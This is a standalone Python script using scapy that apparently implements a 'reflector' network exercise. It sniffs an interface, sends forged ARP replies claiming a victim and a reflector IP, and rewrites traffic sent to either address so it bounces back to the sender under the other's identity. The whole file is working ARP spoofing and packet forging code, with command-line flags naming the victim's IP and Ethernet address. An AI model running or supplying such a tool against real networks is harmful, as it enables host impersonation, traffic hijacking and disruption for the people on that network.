#!/usr/bin/env python3

from scapy.all import *
import sys

interface = ''
victim_ip = ''
victim_eth = ''
reflector_ip = ''
reflector_eth = ''

def sniffer_call_back(pkt):
    
    is_who = 1
    is_at = 2
    if ARP in pkt and pkt[ARP].op == is_who:
        
        if pkt[ARP].pdst == victim_ip:
            arpv = ARP()
            arpv.op = is_at
            arpv.psrc = victim_ip
            arpv.hwsrc = victim_eth
            arpv.pdst = pkt[ARP].psrc
            arpv.hwdst = pkt[ARP].hwsrc
        
            send(arpv) #sending victim pkt
            
        elif pkt[ARP].pdst == reflector_ip:
            arpr = ARP()
            arpr.op = is_at
            arpr.psrc = reflector_ip
            arpr.hwsrc = reflector_eth
            arpr.pdst = pkt[ARP].psrc
            arpr.hwdst = pkt[ARP].hwsrc
        
            send(arpr) #sending reflector pkt

    if pkt.haslayer(IP):
        
        if pkt[IP].dst == victim_ip:
            
            pkt[IP].dst = pkt[IP].src
            pkt[IP].src = reflector_ip
            pkt[Ether].dst = pkt[Ether].src
            pkt[Ether].src = reflector_eth
            
            del pkt[IP].chksum
            if TCP in pkt:
                pkt.show()
                del pkt[TCP].chksum
            elif UDP in pkt:
                pkt.show()
                del pkt[UDP].chksum
            elif ICMP in pkt:
                pkt.show()
                del pkt[ICMP].chksum
           
            sendp(pkt, iface = interface)
            
        elif pkt[IP].dst == reflector_ip:
            
            pkt[IP].dst = pkt[IP].src
            pkt[IP].src = victim_ip
            pkt[Ether].dst =  pkt[Ether].src
            pkt[Ether].src = victim_eth
            
            del pkt[IP].chksum
            if TCP in pkt:
                pkt.show()
                del pkt[TCP].chksum
            elif UDP in pkt:
                pkt.show()
                del pkt[UDP].chksum 
            elif ICMP in pkt:
                pkt.show()
                del pkt[ICMP].chksum
            
            sendp(pkt, iface = interface)
            
    else:
        print("No packets found\n")
        return 0
    
def main(args):
    global interface
    global victim_ip
    global victim_eth
    global reflector_ip
    global reflector_eth

    if len(args) > 1:
        for i in range(1, len(args)):
            print(args[i])
            if args[i] == "--interface":
                interface = args[i + 1]
            if args[i] == "--victim-ip":
                victim_ip = args[i + 1]
            if args[i] == "--victim-ethernet":
                victim_eth = args[i + 1]
            if args[i] == "--reflector-ip":
                reflector_ip = args[i + 1]
            if args[i] == "--reflector-ethernet":
                reflector_eth = args[i + 1]
    
    #count 0 means infinity
    print("sniffing\n")
    sniff(count=0, iface=interface, prn=sniffer_call_back, store=0)
    
    return 0

if __name__ == '__main__':
    
    main(sys.argv)



